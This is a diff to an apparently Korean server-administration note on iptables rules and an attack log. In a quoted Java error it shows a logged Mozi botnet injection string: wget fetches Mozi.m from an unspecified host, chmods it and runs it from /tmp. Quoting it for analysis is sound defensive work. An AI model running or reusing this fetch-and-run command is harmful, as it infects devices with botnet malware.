@@ -13,13 +13,13 @@
 - 저장되어 있는 규칙 확인
 > sudo iptables -L -n -v
 
-![img_1.png](img_1.png)
+![img_1.png](../img/2025/ipControl.png)
 
 
 
 ## 공격 로그
 
-![img.png](img.png)
+![img.png](../img/2025/logAttack.png)
 
 
 ---
@@ -33,7 +33,9 @@
 ### 1. **에러 분석**
 
 ```
-java.lang.IllegalArgumentException: Invalid character found in method name [27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ ]
+java.lang.IllegalArgumentException: 
+Invalid character found in method name 
+[27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ ]
 ```
 
 #### **원인 분석**
